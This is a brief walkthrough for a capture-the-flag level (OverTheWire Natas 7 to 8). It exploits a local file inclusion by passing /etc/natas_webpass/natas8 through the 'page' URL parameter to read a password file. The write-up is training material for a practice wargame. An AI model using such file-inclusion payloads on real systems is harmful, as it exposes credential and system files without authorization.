## Level 8

**URL**: [Level 7](http://natas7.natas.labs.overthewire.org/)

 1. We have 2 links ([Home](http://natas7.natas.labs.overthewire.org/index.php?page=home)  [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)).
	 ```
	 http://natas7.natas.labs.overthewire.org/index.php?page=home
	 http://natas7.natas.labs.overthewire.org/index.php?page=about
	 ```
 2. The following line in page source represents a password's location:
	 ``` html
	 <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
	 ```
	 	 
 3. Go to http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
